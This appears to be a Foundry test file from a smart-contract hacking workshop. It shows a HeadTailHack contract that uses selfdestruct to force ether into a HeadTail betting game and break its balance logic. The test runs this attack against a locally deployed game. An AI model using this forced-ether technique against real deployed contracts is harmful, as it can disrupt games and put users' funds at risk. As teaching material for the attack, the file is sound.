//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/hack-workshop/05_HeadTail.sol";

// https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity
contract HeadTailHack {
    HeadTail _game;

    constructor(HeadTail game) {
        _game = game;
    }

    function close() public payable {
        selfdestruct(payable(address(_game)));
    }
}

contract HeadTailTest is Test {
    HeadTail game;
    HeadTailHack hack;
    address alice;
    address bob;
    bool chooseHead = true;
    uint256 number = 1111;

    function setUp() public {
        alice = address(7777);
        bob = address(8888);

        payable(alice).transfer(2 ether);

        vm.prank(alice);
        game = new HeadTail{value: 1 ether}(
            keccak256(abi.encode(chooseHead, number))
        );

        // vm.prank(bob);
        // game.guess{value: 1 ether}(chooseHead);

        hack = new HeadTailHack(game);
    }

    function testGameHT() public {
        assertEq(address(game).balance, 1 ether);
        console.log("Alice balance", address(alice).balance);
        assertEq(game.partyA(), payable(alice));
        assertEq(alice.balance, 1 ether);

        hack.close{value: 1 ether}();
        console.log("Game balance", address(game).balance);
    }
}
